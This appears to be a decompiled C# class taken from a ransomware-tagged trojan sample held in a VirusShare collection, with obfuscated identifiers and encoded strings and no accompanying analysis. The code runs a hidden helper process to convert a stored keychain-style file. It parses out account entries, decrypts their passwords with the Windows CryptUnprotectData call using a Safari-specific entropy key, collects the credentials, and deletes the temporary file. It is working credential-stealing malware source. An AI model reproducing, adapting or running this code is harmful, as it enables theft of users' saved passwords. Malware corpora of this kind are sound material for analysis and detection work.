// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

internal sealed class \u0006\u2000
{
  private static byte[] \u0002 = new byte[144]
  {
    (byte) 29,
    (byte) 172,
    (byte) 168,
    (byte) 248,
    (byte) 211,
    (byte) 184,
    (byte) 72,
    (byte) 62,
    (byte) 72,
    (byte) 125,
    (byte) 62,
    (byte) 10,
    (byte) 98,
    (byte) 7,
    (byte) 221,
    (byte) 38,
    (byte) 230,
    (byte) 103,
    (byte) 129,
    (byte) 3,
    (byte) 231,
    (byte) 178,
    (byte) 19,
    (byte) 165,
    (byte) 176,
    (byte) 121,
    (byte) 238,
    (byte) 79,
    (byte) 15,
    (byte) 65,
    (byte) 21,
    (byte) 237,
    (byte) 123,
    (byte) 20,
    (byte) 140,
    (byte) 229,
    (byte) 75,
    (byte) 70,
    (byte) 13,
    (byte) 193,
    (byte) 142,
    (byte) 254,
    (byte) 214,
    (byte) 231,
    (byte) 39,
    (byte) 117,
    (byte) 6,
    (byte) 139,
    (byte) 73,
    (byte) 0,
    (byte) 220,
    (byte) 15,
    (byte) 48,
    (byte) 160,
    (byte) 158,
    (byte) 253,
    (byte) 9,
    (byte) 133,
    (byte) 241,
    (byte) 200,
    (byte) 170,
    (byte) 117,
    (byte) 193,
    (byte) 8,
    (byte) 5,
    (byte) 121,
    (byte) 1,
    (byte) 226,
    (byte) 151,
    (byte) 216,
    (byte) 175,
    (byte) 128,
    (byte) 56,
    (byte) 96,
    (byte) 11,
    (byte) 113,
    (byte) 14,
    (byte) 104,
    (byte) 83,
    (byte) 119,
    (byte) 47,
    (byte) 15,
    (byte) 97,
    (byte) 246,
    (byte) 29,
    (byte) 142,
    (byte) 143,
    (byte) 92,
    (byte) 178,
    (byte) 61,
    (byte) 33,
    (byte) 116,
    (byte) 64,
    (byte) 75,
    (byte) 181,
    (byte) 6,
    (byte) 110,
    (byte) 171,
    (byte) 122,
    (byte) 189,
    (byte) 139,
    (byte) 169,
    (byte) 126,
    (byte) 50,
    (byte) 143,
    (byte) 110,
    (byte) 6,
    (byte) 36,
    (byte) 217,
    (byte) 41,
    (byte) 164,
    (byte) 165,
    (byte) 190,
    (byte) 38,
    (byte) 35,
    (byte) 253,
    (byte) 238,
    (byte) 241,
    (byte) 76,
    (byte) 15,
    (byte) 116,
    (byte) 94,
    (byte) 88,
    (byte) 251,
    (byte) 145,
    (byte) 116,
    (byte) 239,
    (byte) 145,
    (byte) 99,
    (byte) 111,
    (byte) 109,
    (byte) 46,
    (byte) 97,
    (byte) 112,
    (byte) 112,
    (byte) 108,
    (byte) 101,
    (byte) 46,
    (byte) 83,
    (byte) 97,
    (byte) 102,
    (byte) 97,
    (byte) 114,
    (byte) 105
  };

  [DllImport("kernel32.dll")]
  private static extern IntPtr LocalFree(IntPtr _param0);

  [DllImport("crypt32.dll")]
  private static extern unsafe bool CryptUnprotectData(
    \u0006\u2000.\u0002* _param0,
    string _param1,
    \u0006\u2000.\u0002* _param2,
    IntPtr _param3,
    IntPtr _param4,
    uint _param5,
    \u0006\u2000.\u0002* _param6);

  public static void \u0002()
  {
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0005\u2003.\u0002(1067755581);
    string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0005\u2003.\u0002(1067755618);
    string str3 = (string) null;
    if (!\u0006\u2000.\u0002(str1, str2, out str3))
      return;
    \u0006\u2000.\u0002(str3.Remove(str3.Length - 2));
  }

  private static void \u0002(string _param0)
  {
    string input = File.ReadAllText(_param0);
    string[] strArray;
    for (int index = 1; index < (strArray = Regex.Split(Regex.Split(input, \u0005\u2003.\u0002(1067755754))[1], \u0005\u2003.\u0002(1067755768))).Length; ++index)
    {
      string str1 = \u0006\u2000.\u0002(strArray[index], \u0005\u2003.\u0002(1067755693), \u0005\u2003.\u0002(1067755682), 0);
      string str2 = \u0006\u2000.\u0002(strArray[index], \u0005\u2003.\u0002(1067755693), \u0005\u2003.\u0002(1067755682), 5);
      string str3 = \u0006\u2000.\u0002(Convert.FromBase64String(\u0006\u2000.\u0002(strArray[index], \u0005\u2003.\u0002(1067755698), \u0005\u2003.\u0002(1067755649), 0)));
      \u000F\u2000.\u0002.Add(new \u0008\u2000(\u0005\u2003.\u0002(1067755671), str2, str1, str3, string.Empty));
    }
    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0005\u2003.\u0002(1067755727));
  }

  private static unsafe string \u0002(byte[] _param0)
  {
    \u0006\u2000.\u0002 obj1;
    obj1.\u0002 = _param0.Length;
    fixed (byte* numPtr = _param0)
      obj1.\u0003 = numPtr;
    \u0006\u2000.\u0002 obj2;
    obj2.\u0002 = \u0006\u2000.\u0002.Length;
    fixed (byte* numPtr = \u0006\u2000.\u0002)
      obj2.\u0003 = numPtr;
    \u0006\u2000.\u0002 obj3;
    if (!\u0006\u2000.CryptUnprotectData(&obj1, (string) null, &obj2, IntPtr.Zero, IntPtr.Zero, 0U, &obj3))
      return (string) null;
    byte* numPtr1 = obj3.\u0003;
    int length = *(int*) numPtr1;
    char[] chArray = new char[length];
    for (int index = 4; index < length + 4; ++index)
      chArray[index - 4] = (char) numPtr1[index];
    \u0006\u2000.LocalFree(new IntPtr((void*) obj3.\u0003));
    return new string(chArray);
  }

  private static bool \u0002(string _param0, string _param1, out string _param2)
  {
    _param2 = (string) null;
    string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0005\u2003.\u0002(1067755734);
    if (!File.Exists(_param0))
    {
      if (!File.Exists(path))
        return false;
      _param0 = path;
    }
    Process process = new Process();
    process.StartInfo.FileName = _param0;
    process.StartInfo.Arguments = \u0005\u2003.\u0002(1067755779) + (_param2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0005\u2003.\u0002(1067755878)) + \u0005\u2003.\u0002(1067755851) + _param1 + \u0005\u2003.\u0002(1067755851);
    process.StartInfo.CreateNoWindow = true;
    process.StartInfo.RedirectStandardOutput = true;
    process.StartInfo.UseShellExecute = false;
    process.Start();
    process.WaitForExit();
    return process.StandardOutput.ReadToEnd().Length == 0;
  }

  private static string \u0002(string _param0, string _param1, string _param2, int _param3) => Regex.Split(Regex.Split(_param0, _param1)[_param3 + 1], _param2)[0];

  private struct \u0002
  {
    public int \u0002;
    public unsafe byte* \u0003;
  }
}
